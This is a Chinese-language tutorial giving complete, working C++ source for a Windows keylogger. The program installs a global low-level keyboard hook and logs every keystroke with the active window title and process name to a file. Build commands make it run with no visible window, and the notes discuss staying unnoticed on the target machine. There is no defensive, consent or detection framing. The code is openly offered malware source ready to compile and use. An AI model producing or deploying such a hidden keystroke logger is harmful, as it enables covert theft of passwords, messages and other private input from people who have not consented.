## 完整实现：`keylog.cpp`（单文件，无第三方依赖）

说明：注释使用英文，以避免 MSVC 在无 `/utf-8` 时对源文件的编码告警；中文解释放在代码块外。

```cpp
// ============================================================================
// keylog.cpp -- global low-level keyboard hook logger (WH_KEYBOARD_LL)
//
//   - installs a process-wide low-level keyboard hook
//   - translates VK codes to printable text via ToUnicodeEx (real layout)
//   - tags each burst with the foreground window title + process name
//   - flushes to a UTF-8 file on a 2 s timer and on a 512-byte threshold
//   - exits on Ctrl+Shift+Q or Ctrl+C, always UnhookWindowsHookEx() first
//
// Build (MSVC)  : cl /nologo /EHsc /O2 /MT /utf-8 keylog.cpp /Fe:keylog.exe
// Build (MinGW) : x86_64-w64-mingw32-g++ -O2 -static -s -o keylog.exe keylog.cpp -luser32
// ============================================================================
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <fstream>
#include <cstdio>
#include <cstring>
#include <cwchar>

#ifdef _MSC_VER
#pragma comment(lib, "user32.lib")
#endif

// ---------------------------- tunables --------------------------------------
static const wchar_t* const kLogPath      = L"keylog.txt";
static const DWORD          kFlushMs      = 2000;   // background flush period
static const size_t         kFlushBytes   = 512;    // buffer threshold to flush
static const bool           kLogWindow    = true;   // tag bursts with window ctx
static const bool           kIgnoreInject = false;  // drop SendInput-originated keys
static const DWORD          kExitVk       = 'Q';    // Ctrl+Shift+Q -> quit

// ---------------------------- state -----------------------------------------
// All of these are touched only from the thread that installed the hook
// (hook proc, WM_TIMER handler and the message loop all run there), so no
// locking is required.
static HHOOK         g_hook    = nullptr;
static std::ofstream g_out;
static std::string   g_buf;          // pending UTF-8 bytes
static std::wstring  g_lastWnd;      // last window title we tagged
static DWORD         g_mainTid = 0;

// ---------------------------- file sink -------------------------------------
static std::string ToUtf8(const std::wstring& w)
{
    if (w.empty()) return std::string();
    int n = ::WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                                  nullptr, 0, nullptr, nullptr);
    if (n <= 0) return std::string();
    std::string s((size_t)n, '\0');
    ::WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                          &s[0], n, nullptr, nullptr);
    return s;
}

static void FlushLog()
{
    if (g_buf.empty()) return;
    if (g_out.is_open()) {
        g_out.write(g_buf.data(), (std::streamsize)g_buf.size());
        g_out.flush();
    }
    g_buf.clear();
}

static void Append(const std::wstring& w)
{
    g_buf += ToUtf8(w);
    if (g_buf.size() >= kFlushBytes) FlushLog();
}

// ---------------------------- window context --------------------------------
// GetWindowTextW() on a foreign HWND sends WM_GETTEXT synchronously and can
// block forever on a hung app. A low-level hook that stalls gets silently
// unhooked by the OS (LowLevelHooksTimeout), so use a bounded send instead.
static std::wstring WindowTitle(HWND hwnd)
{
    wchar_t buf[512] = {};
    DWORD_PTR r = 0;
    if (!::SendMessageTimeoutW(hwnd, WM_GETTEXT, (WPARAM)511, (LPARAM)buf,
                               SMTO_ABORTIFHUNG | SMTO_BLOCK, 100, &r))
        return std::wstring();
    return std::wstring(buf);
}

static std::wstring ProcessNameOfPid(DWORD pid)
{
    std::wstring name;
    HANDLE h = ::OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (h) {
        wchar_t path[MAX_PATH] = {};
        DWORD   n = MAX_PATH;
        if (::QueryFullProcessImageNameW(h, 0, path, &n)) {
            const wchar_t* slash = std::wcsrchr(path, L'\\');
            name = slash ? (slash + 1) : path;
        }
        ::CloseHandle(h);
    }
    return name;
}

static void TrackWindow()
{
    if (!kLogWindow) return;
    HWND fg = ::GetForegroundWindow();
    if (!fg) return;

    std::wstring title = WindowTitle(fg);
    if (title == g_lastWnd) return;
    g_lastWnd = title;
    if (title.empty()) return;

    DWORD pid = 0;
    ::GetWindowThreadProcessId(fg, &pid);
    std::wstring proc = ProcessNameOfPid(pid);

    std::wstring line = L"\n\n[WND] ";
    line += proc.empty() ? L"?" : proc;
    line += L" | ";
    line += title;
    line += L"\n";
    Append(line);
}

// ---------------------------- key translation -------------------------------
static bool KeyDown(int vk)
{
    return (::GetAsyncKeyState(vk) & 0x8000) != 0;
}

// ToUnicodeEx needs the modifier state in the 256-byte key state array.
// Async state is used for the held modifiers; the key being translated is
// not yet down at hook time, which is exactly what we want.
static void BuildKeyboardState(BYTE st[256])
{
    std::memset(st, 0, 256);
    auto set = [&](int vk) { if (::GetAsyncKeyState(vk) & 0x8000) st[vk] = 0x80; };

    set(VK_SHIFT);   set(VK_LSHIFT);   set(VK_RSHIFT);
    set(VK_CONTROL); set(VK_LCONTROL); set(VK_RCONTROL);
    set(VK_MENU);    set(VK_LMENU);    set(VK_RMENU);
    set(VK_LWIN);    set(VK_RWIN);

    if (::GetKeyState(VK_CAPITAL) & 1) st[VK_CAPITAL] = 0x01;
}

static std::wstring Translate(DWORD vk, DWORD scan, bool extended)
{
    (void)extended;

    const bool shift = KeyDown(VK_SHIFT);
    const bool ctrl  = KeyDown(VK_CONTROL);
    const bool alt   = KeyDown(VK_MENU);

    // Ctrl/Alt + letter would otherwise come back as a control char 0x01..0x1A.
    if ((ctrl || alt) && vk >= 'A' && vk <= 'Z') {
        std::wstring s;
        if (ctrl)  s += L"Ctrl+";
        if (alt)   s += L"Alt+";
        if (shift) s += L"Shift+";
        s += (wchar_t)vk;
        return L"[" + s + L"]";
    }

    switch (vk) {
    case VK_RETURN:   return L"\n";
    case VK_TAB:      return L"\t";
    case VK_BACK:     return L"[BKSP]";
    case VK_ESCAPE:   return L"[ESC]";
    case VK_DELETE:   return L"[DEL]";
    case VK_INSERT:   return L"[INS]";
    case VK_HOME:     return L"[HOME]";
    case VK_END:      return L"[END]";
    case VK_PRIOR:    return L"[PGUP]";
    case VK_NEXT:     return L"[PGDN]";
    case VK_LEFT:     return L"[LEFT]";
    case VK_RIGHT:    return L"[RIGHT]";
    case VK_UP:       return L"[UP]";
    case VK_DOWN:     return L"[DOWN]";
    case VK_CAPITAL:  return L"[CAPS]";
    case VK_NUMLOCK:  return L"[NUM]";
    case VK_SCROLL:   return L"[SCR]";
    case VK_SNAPSHOT: return L"[PRTSC]";
    case VK_PAUSE:    return L"[PAUSE]";
    // bare modifiers: log nothing
    case VK_LSHIFT: case VK_RSHIFT:
    case VK_LCONTROL: case VK_RCONTROL:
    case VK_LMENU: case VK_RMENU:
    case VK_LWIN: case VK_RWIN:
    case VK_SHIFT: case VK_CONTROL: case VK_MENU:
        return std::wstring();
    default: break;
    }

    if (vk >= VK_F1 && vk <= VK_F24)
        return L"[F" + std::to_wstring(vk - VK_F1 + 1) + L"]";

    // Layout-aware translation. Use the foreground thread's layout, not ours.
    HKL  hkl = nullptr;
    HWND fg  = ::GetForegroundWindow();
    if (fg) {
        DWORD pid = 0;
        DWORD tid = ::GetWindowThreadProcessId(fg, &pid);
        hkl = ::GetKeyboardLayout(tid);
    }
    if (!hkl) hkl = ::GetKeyboardLayout(0);

    BYTE st[256];
    BuildKeyboardState(st);

    wchar_t out[8] = {};
    int rc = ::ToUnicodeEx(vk, scan, st, out, 8, 0, hkl);
    if (rc == 1) return std::wstring(out, 1);
    if (rc > 1)  return std::wstring(out, (size_t)rc);
    if (rc < 0)  return std::wstring();   // dead key: nothing emitted yet

    // Fallback when the layout yields nothing.
    if (vk >= 'A' && vk <= 'Z')
        return std::wstring(1, (wchar_t)(shift ? vk : (vk - 'A' + 'a')));
    if (vk >= '0' && vk <= '9')
        return std::wstring(1, (wchar_t)vk);
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
        return std::wstring(1, (wchar_t)('0' + (vk - VK_NUMPAD0)));

    return std::wstring();
}

// ---------------------------- hook proc -------------------------------------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        const bool down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

        // Exit hotkey, checked before logging so it leaves no trace in the file.
        if (down && kb->vkCode == kExitVk && KeyDown(VK_CONTROL) && KeyDown(VK_SHIFT)) {
            ::PostQuitMessage(0);
            return ::CallNextHookEx(g_hook, nCode, wParam, lParam);
        }

        if (down && !(kIgnoreInject && (kb->flags & LLKHF_INJECTED))) {
            TrackWindow();
            std::wstring s = Translate(kb->vkCode, kb->scanCode,
                                       (kb->flags & LLKHF_EXTENDED) != 0);
            if (!s.empty()) Append(s);
        }
    }
    // Never swallow input: the hook must stay transparent to the user.
    return ::CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ---------------------------- lifecycle -------------------------------------
static BOOL WINAPI CtrlHandler(DWORD type)
{
    (void)type;
    if (g_mainTid) ::PostThreadMessageW(g_mainTid, WM_QUIT, 0, 0);
    return TRUE;
}

int main()
{
    g_mainTid = ::GetCurrentThreadId();

    g_out.open(kLogPath, std::ios::binary | std::ios::app);
    if (!g_out.is_open()) {
        std::fwprintf(stderr, L"[-] cannot open %s\n", kLogPath);
        return 1;
    }
    if (g_out.tellp() == 0) {                 // BOM so the file is valid UTF-8
        const char bom[3] = { '\xEF', '\xBB', '\xBF' };
        g_out.write(bom, 3);
        g_out.flush();
    }

    ::SetConsoleCtrlHandler(CtrlHandler, TRUE);

    // WH_KEYBOARD_LL is dispatched on the installing thread, so hMod may be
    // the current module handle; the thread must pump messages for the hook
    // to receive anything.
    g_hook = ::SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                 ::GetModuleHandleW(nullptr), 0);
    if (!g_hook) {
        std::fwprintf(stderr, L"[-] SetWindowsHookExW failed: %lu\n", ::GetLastError());
        return 2;
    }

    std::wprintf(L"[*] hooked -> %s   (Ctrl+Shift+Q to quit)\n", kLogPath);
    ::SetTimer(nullptr, 0, kFlushMs, nullptr);   // thread timer, hwnd == NULL

    MSG  msg;
    BOOL r;
    while ((r = ::GetMessageW(&msg, nullptr, 0, 0)) > 0) {
        if (msg.message == WM_TIMER && msg.hwnd == nullptr) {
            FlushLog();
            continue;
        }
        ::TranslateMessage(&msg);
        ::DispatchMessageW(&msg);
    }

    // Deterministic teardown: never leave the hook installed on a normal exit.
    ::KillTimer(nullptr, 0);
    ::UnhookWindowsHookEx(g_hook);
    g_hook = nullptr;
    FlushLog();
    g_out.close();
    std::wprintf(L"[*] unhooked, clean exit\n");

    return (r == -1) ? 3 : 0;
}
```

## 编译命令

**MSVC（x64 Native Tools Prompt）：**

```bat
cl /nologo /EHsc /O2 /MT /utf-8 keylog.cpp /Fe:keylog.exe
```

无控制台窗口（运行时不可见）：

```bat
cl /nologo /EHsc /O2 /MT /utf-8 keylog.cpp /Fe:keylog.exe ^
   /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
```

**MinGW-w64（本机或 Linux 交叉编译）：**

```bash
x86_64-w64-mingw32-g++ -O2 -static -s -o keylog.exe keylog.cpp -luser32
# 无控制台
x86_64-w64-mingw32-g++ -O2 -static -s -mwindows -e_mainCRTStartup -o keylog.exe keylog.cpp -luser32
```

## 运行与验证步骤

```bat
keylog.exe
:: 在记事本里输入: Hello 123 然后回车
:: 打开 keylog.txt 检查
type keylog.txt
:: 按 Ctrl+Shift+Q 退出，控制台应打印 "[*] unhooked, clean exit"
:: 再次输入任意内容，keylog.txt 不再增长 —— 证明钩子已卸载
```

预期文件内容（节选）：

```
[WND] notepad.exe | 无标题 - 记事本
Hello 123
```

## 实现要点

- **必须有消息循环**。`WH_KEYBOARD_LL` 的回调在安装钩子的线程上执行，不进行消息泵送就收不到任何按键。这里用 `GetMessageW` 循环，`WM_TIMER` 直接从线程队列中取出以做周期落盘，`PostQuitMessage(0)` 让循环以 0 退出。
- **卸载顺序**：`KillTimer` → `UnhookWindowsHookEx` → `FlushLog` → `close`。即使进程被强杀，OS 也会在安装线程终止时自动摘钩，不会残留全局钩子，但缓冲区里未落盘的数据会丢，所以阈值 512 字节 + 2 秒定时双保险。
- **不能吞键**。回调一律 `return CallNextHookEx(...)`，否则用户键盘会“失灵”，这在测试机上会立刻暴露。
- **钩子超时**。系统有 `LowLevelHooksTimeout`（Win8+ 默认 300 ms），回调超时会被静默摘钩。所以 `TrackWindow()` 里不用 `GetWindowTextW`（跨进程同步 `WM_GETTEXT` 会阻塞在挂起的 UI 线程上），改用 `SendMessageTimeoutW(..., SMTO_ABORTIFHUNG, 100)`。
- **翻译用 `ToUnicodeEx` + 前台线程键盘布局**（`GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow()))`），而不是 `GetKeyState` 拼 ASCII，否则非 US 布局、死键、numpad 全部错位。死键返回 `rc == -1` 时丢弃（下一键会带出合成字符）。
- **修饰键状态用 `GetAsyncKeyState`**：钩子触发时待翻译的键尚未置位，正合适；CapsLock 用 `GetKeyState(VK_CAPITAL) & 1` 取 toggle 位，写进 `st[VK_CAPITAL] = 0x01`。
- **注入过滤**：`kIgnoreInject` 置 true 时按 `LLKHF_INJECTED` 丢弃 `SendInput` 产生的输入，自测脚本回放时不会污染样本。
- **覆盖范围**：低层钩子由 raw input 线程派发，所以走 RawInput/DirectInput 的程序（含多数游戏客户端）同样能收到；缺口是安全桌面（UAC 提权框、登录界面）——那是另一个 desktop，钩子不会被调用。

